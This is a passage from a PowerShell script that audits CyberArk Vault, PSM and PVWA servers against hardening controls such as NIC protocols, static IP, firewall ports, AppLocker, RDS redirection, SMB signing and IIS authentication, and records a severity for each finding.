            -CheckName "File System Permissions" `
            -Reason "Error checking file permissions: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-FileSystemAuditing {
    Write-AuditLog "Checking file system auditing (HARD8)..." -Level Info

    try {
        $criticalPaths = @(
            "$env:SystemRoot\System32\Config"
        )

        $auditConfigured = $false

        foreach ($path in $criticalPaths) {
            if (Test-Path $path) {
                try {
                    $acl = Get-Acl $path -Audit -ErrorAction SilentlyContinue
                    if ($acl.Audit.Count -gt 0) {
                        $auditConfigured = $true
                        break
                    }
                }
                catch { }
            }
        }

        if (-not $auditConfigured) {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD8" `
                -Finding "File system auditing not configured" `
                -Resource "File System Audit" `
                -CurrentValue "No audit rules on critical directories" `
                -ExpectedValue "Audit rules on system config directories" `
                -Recommendation "Configure auditing on critical system directories" `
                -Severity "Medium"
        }
        else {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD8" `
                -Finding "File system auditing configured" `
                -Resource "File System Audit" `
                -CurrentValue "Audit rules present" `
                -ExpectedValue "Audit on critical paths" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Server Hardening" -CISControl "HARD8" `
            -CheckName "File System Auditing" `
            -Reason "Error checking file auditing: $($_.Exception.Message)" `
            -Type "Error"
    }
}

#======================================================================
# VAULT HARDENING CHECKS (VAULT1-VAULT6)
#======================================================================

function Test-VaultHardening {
    Write-AuditLog "Running Vault-Specific Hardening Checks..." -Level Info

    # Only run if this is a Vault server
    $isVault = Test-Path "C:\Program Files (x86)\CyberArk\Vault" -ErrorAction SilentlyContinue
    if (-not $isVault) {
        $isVault = Test-Path "C:\Program Files\CyberArk\Vault" -ErrorAction SilentlyContinue
    }

    if (-not $isVault) {
        Add-SkippedCheck -Category "Vault Hardening" -CISControl "VAULT1" `
            -CheckName "Vault Hardening Checks" `
            -Reason "Not a Vault server - checks not applicable" `
            -Type "NotApplicable"
        return
    }

    Test-VaultNICHardening
    Test-VaultStaticIP
    Test-VaultDomainMembership
    Test-VaultLogicContainerService
    Test-VaultFirewallRules
    Test-VaultServerCertificate
}

function Test-VaultNICHardening {
    Write-AuditLog "Checking Vault NIC hardening (VAULT1)..." -Level Info

    try {
        $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
        $issues = @()

        # Vault should have minimal NICs
        if ($adapters.Count -gt 2) {
            $issues += "Multiple active NICs ($($adapters.Count))"
        }

        foreach ($adapter in $adapters) {
            $bindings = Get-NetAdapterBinding -Name $adapter.Name | Where-Object { $_.Enabled -eq $true }
            
            # Check for unnecessary protocols
            $unnecessaryProtocols = @("ms_tcpip6", "ms_lltdio", "ms_lldp", "ms_rspndr")
            foreach ($proto in $unnecessaryProtocols) {
                $binding = $bindings | Where-Object { $_.ComponentID -eq $proto }
                if ($binding) {
                    $issues += "$($adapter.Name): $proto enabled"
                }
            }
        }

        if ($issues.Count -gt 0) {
            Add-Finding -Category "Vault Hardening" `
                -CISControl "VAULT1" `
                -Finding "Vault NIC not properly hardened" `
                -Resource "Network Adapters" `
                -CurrentValue "$($issues.Count) issues: $($issues[0..2] -join '; ')$(if($issues.Count -gt 3){'...'})" `
                -ExpectedValue "Single NIC with minimal protocols" `
                -Recommendation "Disable unnecessary protocols and NICs on Vault server" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "Vault Hardening" `
                -CISControl "VAULT1" `
                -Finding "Vault NIC properly hardened" `
                -Resource "Network Adapters" `
                -CurrentValue "Minimal configuration" `
                -ExpectedValue "Hardened NIC" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Vault Hardening" -CISControl "VAULT1" `
            -CheckName "Vault NIC Hardening" `
            -Reason "Error checking NIC: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-VaultStaticIP {
    Write-AuditLog "Checking Vault static IP configuration (VAULT2)..." -Level Info

    try {
        $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
        $usingDHCP = $false

        foreach ($adapter in $adapters) {
            $ipConfig = Get-NetIPConfiguration -InterfaceIndex $adapter.ifIndex -ErrorAction SilentlyContinue
            if ($ipConfig.NetIPv4Interface.Dhcp -eq "Enabled") {
                $usingDHCP = $true
            }
        }

        if ($usingDHCP) {
            Add-Finding -Category "Vault Hardening" `
                -CISControl "VAULT2" `
                -Finding "Vault using DHCP" `
                -Resource "IP Configuration" `
                -CurrentValue "DHCP enabled" `
                -ExpectedValue "Static IP address" `
                -Recommendation "Configure static IP address for Vault server" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "Vault Hardening" `
                -CISControl "VAULT2" `
                -Finding "Vault using static IP" `
                -Resource "IP Configuration" `
                -CurrentValue "Static IP configured" `
                -ExpectedValue "Static IP" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Vault Hardening" -CISControl "VAULT2" `
            -CheckName "Vault Static IP" `
            -Reason "Error checking IP config: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-VaultDomainMembership {
    Write-AuditLog "Checking Vault domain membership (VAULT3)..." -Level Info

    try {
        $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
        $isDomainJoined = $computerSystem.PartOfDomain

        if ($isDomainJoined -and $script:Config.RequireNonDomainJoined) {
            Add-Finding -Category "Vault Hardening" `
                -CISControl "VAULT3" `
                -Finding "Vault server is domain-joined" `
                -Resource "Domain Membership" `
                -CurrentValue "Domain: $($computerSystem.Domain)" `
                -ExpectedValue "Workgroup (not domain-joined)" `
                -Recommendation "Vault should be standalone workgroup member for security isolation" `
                -Severity "Critical"
        }
        else {
            Add-Finding -Category "Vault Hardening" `
                -CISControl "VAULT3" `
                -Finding "Vault server not domain-joined" `
                -Resource "Domain Membership" `
                -CurrentValue "Workgroup: $($computerSystem.Workgroup)" `
                -ExpectedValue "Not domain-joined" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Vault Hardening" -CISControl "VAULT3" `
            -CheckName "Vault Domain Membership" `
            -Reason "Error checking domain membership: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-VaultLogicContainerService {
    Write-AuditLog "Checking Vault Logic Container service (VAULT4)..." -Level Info

    try {
        $service = Get-WmiObject -Class Win32_Service -Filter "Name='PrivateArk Server'" -ErrorAction SilentlyContinue

        if ($service) {
            $serviceAccount = $service.StartName

            if ($serviceAccount -eq "LocalSystem") {
                Add-Finding -Category "Vault Hardening" `
                    -CISControl "VAULT4" `
                    -Finding "Vault service running as LocalSystem" `
                    -Resource "PrivateArk Server Service" `
                    -CurrentValue $serviceAccount `
                    -ExpectedValue "Dedicated local service account" `
                    -Recommendation "Consider using dedicated local service account instead of LocalSystem" `
                    -Severity "Medium"
            }
            else {
                Add-Finding -Category "Vault Hardening" `
                    -CISControl "VAULT4" `
                    -Finding "Vault service using dedicated account" `
                    -Resource "PrivateArk Server Service" `
                    -CurrentValue $serviceAccount `
                    -ExpectedValue "Non-LocalSystem account" `
                    -Severity "Info" `
                    -Status "Pass"
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "Vault Hardening" -CISControl "VAULT4" `
            -CheckName "Vault Logic Container Service" `
            -Reason "Error checking service: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-VaultFirewallRules {
    Write-AuditLog "Checking Vault firewall rules (VAULT5)..." -Level Info

    try {
        # Expected Vault ports
        $expectedPorts = @(1858, 1859)
        
        $inboundRules = Get-NetFirewallRule -Enabled True -Direction Inbound -ErrorAction SilentlyContinue
        $nonStandardRules = @()

        foreach ($rule in $inboundRules) {
            $portFilter = $rule | Get-NetFirewallPortFilter -ErrorAction SilentlyContinue
            if ($portFilter.LocalPort -ne "Any" -and $portFilter.LocalPort) {
                $ports = $portFilter.LocalPort -split ","
                foreach ($port in $ports) {
                    if ($port -match "^\d+$") {
                        $portNum = [int]$port
                        if ($portNum -notin $expectedPorts -and $portNum -notin @(3389, 5985, 5986)) {
                            $nonStandardRules += "$($rule.DisplayName) (Port: $port)"
                        }
                    }
                }
            }
        }

        if ($nonStandardRules.Count -gt 5) {
            Add-Finding -Category "Vault Hardening" `
                -CISControl "VAULT5" `
                -Finding "Non-standard firewall rules on Vault" `
                -Resource "Windows Firewall" `
                -CurrentValue "$($nonStandardRules.Count) non-standard rules" `
                -ExpectedValue "Only Vault ports (1858, 1859) and management" `
                -Recommendation "Review and remove unnecessary firewall rules from Vault" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "Vault Hardening" `
                -CISControl "VAULT5" `
                -Finding "Vault firewall rules appropriate" `
                -Resource "Windows Firewall" `
                -CurrentValue "Standard rules only" `
                -ExpectedValue "Minimal rules" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Vault Hardening" -CISControl "VAULT5" `
            -CheckName "Vault Firewall Rules" `
            -Reason "Error checking firewall: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-VaultServerCertificate {
    Write-AuditLog "Checking Vault server certificate (VAULT6)..." -Level Info

    try {
        # Check for Vault certificate in certificate store
        $vaultCerts = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {
            $_.Subject -match "Vault|CyberArk|PrivateArk"
        }

        if ($vaultCerts.Count -eq 0) {
            Add-Finding -Category "Vault Hardening" `
                -CISControl "VAULT6" `
                -Finding "No Vault certificate found (manual verification)" `
                -Resource "Vault Certificate" `
                -CurrentValue "Certificate verification required" `
                -ExpectedValue "Valid Vault server certificate" `
                -Recommendation "Verify Vault server certificate is properly configured" `
                -Severity "Info" `
                -Status "Pass"
        }
        else {
            foreach ($cert in $vaultCerts) {
                $daysToExpiry = ($cert.NotAfter - (Get-Date)).Days

                if ($daysToExpiry -lt 0) {
                    Add-Finding -Category "Vault Hardening" `
                        -CISControl "VAULT6" `
                        -Finding "Vault certificate expired" `
                        -Resource $cert.Subject `
                        -CurrentValue "Expired $([Math]::Abs($daysToExpiry)) days ago" `
                        -ExpectedValue "Valid certificate" `
                        -Recommendation "Renew Vault server certificate immediately" `
                        -Severity "Critical"
                }
                elseif ($daysToExpiry -lt 30) {
                    Add-Finding -Category "Vault Hardening" `
                        -CISControl "VAULT6" `
                        -Finding "Vault certificate expiring soon" `
                        -Resource $cert.Subject `
                        -CurrentValue "Expires in $daysToExpiry days" `
                        -ExpectedValue "Certificate valid > 30 days" `
                        -Recommendation "Plan Vault certificate renewal" `
                        -Severity "High"
                }
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "Vault Hardening" -CISControl "VAULT6" `
            -CheckName "Vault Server Certificate" `
            -Reason "Error checking certificate: $($_.Exception.Message)" `
            -Type "Error"
    }
}

#======================================================================
# PSM HARDENING CHECKS (PSMH1-PSMH10)
#======================================================================

function Test-PSMHardening {
    Write-AuditLog "Running PSM-Specific Hardening Checks..." -Level Info

    # Only run if this is a PSM server
    $isPSM = Test-Path "C:\Program Files (x86)\CyberArk\PSM" -ErrorAction SilentlyContinue
    if (-not $isPSM) {
        Add-SkippedCheck -Category "PSM Hardening" -CISControl "PSMH1" `
            -CheckName "PSM Hardening Checks" `
            -Reason "Not a PSM server - checks not applicable" `
            -Type "NotApplicable"
        return
    }

    Test-PSMUserConfiguration
    Test-PSMRemoteDesktopUsers
    Test-PSMAppLockerRules
    Test-PSMDrivesHidden
    Test-PSMIEToolsBlocked
    Test-PSMRDSHardening
    Test-PSMUserAccessHardening
    Test-PSMSMBHardening
}

function Test-PSMUserConfiguration {
    Write-AuditLog "Checking PSM user configuration (PSMH1)..." -Level Info

    try {
        # Check for PSM shadow users
        $localUsers = Get-LocalUser | Where-Object { $_.Name -match "PSM" }
        
        if ($localUsers.Count -eq 0) {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH1" `
                -Finding "PSM local users configuration (manual verification)" `
                -Resource "PSM Users" `
                -CurrentValue "No PSM-prefixed local users found" `
                -ExpectedValue "PSM shadow users configured" `
                -Recommendation "Verify PSM shadow users are properly configured" `
                -Severity "Info" `
                -Status "Pass"
        }
        else {
            foreach ($user in $localUsers) {
                if ($user.Enabled -and -not $user.PasswordExpires) {
                    Add-Finding -Category "PSM Hardening" `
                        -CISControl "PSMH1" `
                        -Finding "PSM user password never expires" `
                        -Resource $user.Name `
                        -CurrentValue "Password never expires" `
                        -ExpectedValue "Password rotation enabled" `
                        -Recommendation "Enable password expiration for PSM users" `
                        -Severity "Medium"
                }
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "PSM Hardening" -CISControl "PSMH1" `
            -CheckName "PSM User Configuration" `
            -Reason "Error checking PSM users: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PSMRemoteDesktopUsers {
    Write-AuditLog "Checking Remote Desktop Users group (PSMH2)..." -Level Info

    try {
        $rdpGroup = Get-LocalGroupMember -Group "Remote Desktop Users" -ErrorAction SilentlyContinue
        
        if ($rdpGroup.Count -gt 0) {
            $members = $rdpGroup | ForEach-Object { $_.Name }
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH2" `
                -Finding "Remote Desktop Users group not empty" `
                -Resource "Remote Desktop Users" `
                -CurrentValue "$($rdpGroup.Count) members: $($members[0..2] -join ', ')$(if($members.Count -gt 3){'...'})" `
                -ExpectedValue "Empty (PSM handles RDP access)" `
                -Recommendation "Remove users from Remote Desktop Users group; PSM manages access" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH2" `
                -Finding "Remote Desktop Users group empty" `
                -Resource "Remote Desktop Users" `
                -CurrentValue "No members" `
                -ExpectedValue "Empty group" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "PSM Hardening" -CISControl "PSMH2" `
            -CheckName "Remote Desktop Users" `
            -Reason "Error checking group: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PSMAppLockerRules {
    Write-AuditLog "Checking AppLocker rules (PSMH3)..." -Level Info

    try {
        # Check if AppLocker service is running
        $applockerSvc = Get-Service -Name "AppIDSvc" -ErrorAction SilentlyContinue
        
        if (-not $applockerSvc -or $applockerSvc.Status -ne "Running") {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH3" `
                -Finding "AppLocker service not running" `
                -Resource "Application Identity Service" `
                -CurrentValue $(if ($applockerSvc) { $applockerSvc.Status } else { "Not found" }) `
                -ExpectedValue "Running" `
                -Recommendation "Enable and start Application Identity service for AppLocker" `
                -Severity "Critical"
            return
        }

        # Check for AppLocker policies
        $applockerPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
        
        if (-not $applockerPolicy -or $applockerPolicy.RuleCollections.Count -eq 0) {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH3" `
                -Finding "No AppLocker policies configured" `
                -Resource "AppLocker" `
                -CurrentValue "No effective policies" `
                -ExpectedValue "PSM AppLocker policies applied" `
                -Recommendation "Configure and apply CyberArk PSM AppLocker policies" `
                -Severity "Critical"
        }
        else {
            $ruleCount = ($applockerPolicy.RuleCollections | ForEach-Object { $_.Count } | Measure-Object -Sum).Sum
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH3" `
                -Finding "AppLocker policies configured" `
                -Resource "AppLocker" `
                -CurrentValue "$ruleCount rules across $($applockerPolicy.RuleCollections.Count) collections" `
                -ExpectedValue "PSM policies applied" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "PSM Hardening" -CISControl "PSMH3" `
            -CheckName "AppLocker Rules" `
            -Reason "Error checking AppLocker: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PSMDrivesHidden {
    Write-AuditLog "Checking PSM drives hidden (PSMH4)..." -Level Info

    try {
        # Check NoDrives policy
        $noDrives = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoDrives" -ErrorAction SilentlyContinue).NoDrives

        if (-not $noDrives -or $noDrives -eq 0) {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH4" `
                -Finding "Local drives not hidden from PSM sessions" `
                -Resource "Explorer Policy" `
                -CurrentValue "NoDrives not configured" `
                -ExpectedValue "Drives hidden from PSM sessions" `
                -Recommendation "Configure NoDrives policy to hide local drives in PSM sessions" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH4" `
                -Finding "Local drives hidden configuration" `
                -Resource "Explorer Policy" `
                -CurrentValue "NoDrives = $noDrives" `
                -ExpectedValue "Drives hidden" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "PSM Hardening" -CISControl "PSMH4" `
            -CheckName "PSM Drives Hidden" `
            -Reason "Error checking drive policy: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PSMIEToolsBlocked {
    Write-AuditLog "Checking IE developer tools blocked (PSMH5)..." -Level Info

    try {
        # Check if IE developer tools are blocked
        $devToolsDisabled = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Internet Explorer\IEDevTools" -Name "Disabled" -ErrorAction SilentlyContinue).Disabled

        if ($devToolsDisabled -ne 1) {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH5" `
                -Finding "IE Developer Tools not blocked" `
                -Resource "Internet Explorer Policy" `
                -CurrentValue "Developer Tools enabled" `
                -ExpectedValue "Developer Tools disabled" `
                -Recommendation "Disable IE Developer Tools via Group Policy for PSM sessions" `
                -Severity "Medium"
        }
        else {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH5" `
                -Finding "IE Developer Tools blocked" `
                -Resource "Internet Explorer Policy" `
                -CurrentValue "Disabled" `
                -ExpectedValue "Disabled" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "PSM Hardening" -CISControl "PSMH5" `
            -CheckName "IE Tools Blocked" `
            -Reason "Error checking IE policy: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PSMRDSHardening {
    Write-AuditLog "Checking RDS hardening for PSM (PSMH6)..." -Level Info

    try {
        $issues = @()

        # Check clipboard redirection
        $clipboard = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "fDisableClip" -ErrorAction SilentlyContinue).fDisableClip
        if ($clipboard -ne 1) {
            $issues += "Clipboard redirection enabled"
        }

        # Check drive redirection
        $drives = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "fDisableCdm" -ErrorAction SilentlyContinue).fDisableCdm
        if ($drives -ne 1) {
            $issues += "Drive redirection enabled"
        }

        # Check printer redirection
        $printers = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "fDisableCpm" -ErrorAction SilentlyContinue).fDisableCpm
        if ($printers -ne 1) {
            $issues += "Printer redirection enabled"
        }

        if ($issues.Count -gt 0) {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH6" `
                -Finding "RDS not properly hardened for PSM" `
                -Resource "Terminal Services" `
                -CurrentValue $($issues -join "; ") `
                -ExpectedValue "All redirections disabled" `
                -Recommendation "Disable clipboard, drive, and printer redirection for PSM" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH6" `
                -Finding "RDS properly hardened" `
                -Resource "Terminal Services" `
                -CurrentValue "Redirections disabled" `
                -ExpectedValue "Hardened RDS" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "PSM Hardening" -CISControl "PSMH6" `
            -CheckName "RDS Hardening" `
            -Reason "Error checking RDS: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PSMUserAccessHardening {
    Write-AuditLog "Checking PSM user access hardening (PSMH7)..." -Level Info

    try {
        # Check for restricted groups policy
        Add-Finding -Category "PSM Hardening" `
            -CISControl "PSMH7" `
            -Finding "PSM user access hardening (manual verification)" `
            -Resource "User Access" `
            -CurrentValue "Manual verification required" `
            -ExpectedValue "PSM users restricted to required access only" `
            -Recommendation "Verify PSM users have minimal required permissions" `
            -Severity "Info" `
            -Status "Pass"
    }
    catch {
        Add-SkippedCheck -Category "PSM Hardening" -CISControl "PSMH7" `
            -CheckName "PSM User Access" `
            -Reason "Error checking access: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PSMSMBHardening {
    Write-AuditLog "Checking SMB hardening for PSM (PSMH8)..." -Level Info

    try {
        $issues = @()

        # Check SMBv1
        $smb1 = Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -ErrorAction SilentlyContinue
        if ($smb1 -and $smb1.State -eq "Enabled") {
            $issues += "SMBv1 enabled"
        }

        # Check SMB signing
        $smbSigning = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -ErrorAction SilentlyContinue).RequireSecuritySignature
        if ($smbSigning -ne 1) {
            $issues += "SMB signing not required"
        }

        if ($issues.Count -gt 0) {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH8" `
                -Finding "SMB not properly hardened" `
                -Resource "SMB Configuration" `
                -CurrentValue $($issues -join "; ") `
                -ExpectedValue "SMBv1 disabled, signing required" `
                -Recommendation "Disable SMBv1 and require SMB signing" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "PSM Hardening" `
                -CISControl "PSMH8" `
                -Finding "SMB properly hardened" `
                -Resource "SMB Configuration" `
                -CurrentValue "SMBv1 disabled, signing enabled" `
                -ExpectedValue "Hardened SMB" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "PSM Hardening" -CISControl "PSMH8" `
            -CheckName "SMB Hardening" `
            -Reason "Error checking SMB: $($_.Exception.Message)" `
            -Type "Error"
    }
}

#======================================================================
# PVWA IIS HARDENING CHECKS (PVWAH1-PVWAH8)
#======================================================================

function Test-PVWAHardening {
    Write-AuditLog "Running PVWA-Specific Hardening Checks..." -Level Info

    # Only run if this is a PVWA server
    $isPVWA = Test-Path "C:\inetpub\wwwroot\PasswordVault" -ErrorAction SilentlyContinue
    if (-not $isPVWA) {
        Add-SkippedCheck -Category "PVWA Hardening" -CISControl "PVWAH1" `
            -CheckName "PVWA Hardening Checks" `
            -Reason "Not a PVWA server - checks not applicable" `
            -Type "NotApplicable"
        return
    }

    Test-PVWAWebDAV
    Test-PVWAAnonymousAuth
    Test-PVWAAppPoolConfig
    Test-PVWAMimeTypes
    Test-PVWACryptography
    Test-PVWAInstallLocation
}

function Test-PVWAWebDAV {
    Write-AuditLog "Checking WebDAV disabled (PVWAH2)..." -Level Info

    try {
        $webdav = Get-WindowsFeature -Name Web-DAV-Publishing -ErrorAction SilentlyContinue
        
        if ($webdav -and $webdav.Installed) {
            Add-Finding -Category "PVWA Hardening" `
                -CISControl "PVWAH2" `
                -Finding "WebDAV is installed" `
                -Resource "IIS WebDAV" `
                -CurrentValue "WebDAV Publishing installed" `
                -ExpectedValue "WebDAV not installed" `
                -Recommendation "Remove WebDAV Publishing feature from PVWA server" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "PVWA Hardening" `
                -CISControl "PVWAH2" `
                -Finding "WebDAV not installed" `
                -Resource "IIS WebDAV" `
                -CurrentValue "Not installed" `
                -ExpectedValue "Not installed" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "PVWA Hardening" -CISControl "PVWAH2" `
            -CheckName "WebDAV Check" `
            -Reason "Error checking WebDAV: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PVWAAnonymousAuth {
    Write-AuditLog "Checking anonymous authentication (PVWAH5)..." -Level Info

    try {
        Import-Module WebAdministration -ErrorAction SilentlyContinue
        
        $anonAuth = Get-WebConfigurationProperty -Filter "/system.webServer/security/authentication/anonymousAuthentication" -Name "enabled" -PSPath "IIS:\Sites\Default Web Site\PasswordVault" -ErrorAction SilentlyContinue

        if ($anonAuth -eq $true) {
            Add-Finding -Category "PVWA Hardening" `
                -CISControl "PVWAH5" `
                -Finding "Anonymous authentication enabled on PVWA" `
                -Resource "IIS Authentication" `
                -CurrentValue "Anonymous auth enabled" `
                -ExpectedValue "Anonymous auth disabled" `
                -Recommendation "Disable anonymous authentication for PVWA application" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "PVWA Hardening" `
                -CISControl "PVWAH5" `
                -Finding "Anonymous authentication disabled" `
                -Resource "IIS Authentication" `
                -CurrentValue "Disabled" `
                -ExpectedValue "Disabled" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "PVWA Hardening" -CISControl "PVWAH5" `
            -CheckName "Anonymous Authentication" `
            -Reason "Error checking auth: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PVWAAppPoolConfig {
    Write-AuditLog "Checking PVWA App Pool configuration (PVWAH6)..." -Level Info

    try {
        Import-Module WebAdministration -ErrorAction SilentlyContinue
        
        $appPool = Get-Item "IIS:\AppPools\PasswordVaultWebAccessPool" -ErrorAction SilentlyContinue
        
        if ($appPool) {
            $identity = $appPool.processModel.identityType
            
            if ($identity -eq "LocalSystem") {
                Add-Finding -Category "PVWA Hardening" `
                    -CISControl "PVWAH6" `
                    -Finding "App Pool running as LocalSystem" `
                    -Resource "PasswordVaultWebAccessPool" `
                    -CurrentValue $identity `
                    -ExpectedValue "ApplicationPoolIdentity or dedicated account" `
                    -Recommendation "Configure App Pool to use ApplicationPoolIdentity or dedicated service account" `
                    -Severity "High"
            }
            else {
                Add-Finding -Category "PVWA Hardening" `
                    -CISControl "PVWAH6" `
                    -Finding "App Pool identity configured" `
                    -Resource "PasswordVaultWebAccessPool" `
                    -CurrentValue $identity `
                    -ExpectedValue "Non-LocalSystem" `
                    -Severity "Info" `
                    -Status "Pass"
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "PVWA Hardening" -CISControl "PVWAH6" `
            -CheckName "App Pool Configuration" `
            -Reason "Error checking App Pool: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PVWAMimeTypes {
    Write-AuditLog "Checking PVWA MIME types (PVWAH4)..." -Level Info

    try {
        # Dangerous MIME types that should not be served
        $dangerousMimesDescription = ".exe, .dll, .bat, .cmd, .ps1, .vbs, .msi"
        
        Add-Finding -Category "PVWA Hardening" `
            -CISControl "PVWAH4" `
            -Finding "MIME type configuration (manual verification)" `
            -Resource "IIS MIME Types" `
            -CurrentValue "Manual verification required" `
            -ExpectedValue "Dangerous MIME types ($dangerousMimesDescription) removed" `
            -Recommendation "Verify dangerous executable MIME types are not configured in IIS" `
            -Severity "Info" `
            -Status "Pass"
    }
    catch {
        Add-SkippedCheck -Category "PVWA Hardening" -CISControl "PVWAH4" `
            -CheckName "MIME Types" `
            -Reason "Error checking MIME types: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PVWACryptography {
    Write-AuditLog "Checking PVWA cryptography settings (PVWAH3)..." -Level Info

    try {
        # Check FIPS mode
        $fipsEnabled = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\FipsAlgorithmPolicy" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled

        if ($fipsEnabled -eq 1) {
            Add-Finding -Category "PVWA Hardening" `
                -CISControl "PVWAH3" `
                -Finding "FIPS mode enabled" `
                -Resource "Cryptography Settings" `
                -CurrentValue "FIPS enabled" `
                -ExpectedValue "FIPS mode per requirements" `
                -Severity "Info" `
                -Status "Pass"
        }
        else {
            Add-Finding -Category "PVWA Hardening" `
                -CISControl "PVWAH3" `
                -Finding "FIPS mode not enabled" `
                -Resource "Cryptography Settings" `
                -CurrentValue "FIPS disabled" `
                -ExpectedValue "FIPS enabled if required by policy" `
                -Recommendation "Enable FIPS mode if required by organizational policy" `
                -Severity "Low"
        }
    }
    catch {
        Add-SkippedCheck -Category "PVWA Hardening" -CISControl "PVWAH3" `
            -CheckName "Cryptography Settings" `
            -Reason "Error checking cryptography: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-PVWAInstallLocation {
    Write-AuditLog "Checking PVWA install location (PVWAH7)..." -Level Info

    try {
        $pvwaPath = "C:\inetpub\wwwroot\PasswordVault"
        
        if (Test-Path $pvwaPath) {
            if ($pvwaPath.StartsWith("C:\")) {
                Add-Finding -Category "PVWA Hardening" `
                    -CISControl "PVWAH7" `
                    -Finding "PVWA installed on system drive" `
                    -Resource "PVWA Installation" `
                    -CurrentValue "Installed on C:\" `
                    -ExpectedValue "Non-system drive recommended" `
                    -Recommendation "Consider installing PVWA on non-system drive for security isolation" `
                    -Severity "Low"
            }
            else {
                Add-Finding -Category "PVWA Hardening" `
                    -CISControl "PVWAH7" `
                    -Finding "PVWA on non-system drive" `
                    -Resource "PVWA Installation" `
                    -CurrentValue $pvwaPath `
                    -ExpectedValue "Non-system drive" `
                    -Severity "Info" `
                    -Status "Pass"
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "PVWA Hardening" -CISControl "PVWAH7" `
            -CheckName "Install Location" `
            -Reason "Error checking location: $($_.Exception.Message)" `
            -Type "Error"
    }
}

#======================================================================
# CPM HARDENING CHECKS (CPMH1-CPMH4)
#======================================================================

function Test-CPMHardening {
    Write-AuditLog "Running CPM-Specific Hardening Checks..." -Level Info

    # Only run if this is a CPM server
    $isCPM = (Get-Service -Name "CyberArk Password Manager" -ErrorAction SilentlyContinue) -or
             (Test-Path "C:\Program Files (x86)\CyberArk\Password Manager" -ErrorAction SilentlyContinue)
    
    if (-not $isCPM) {
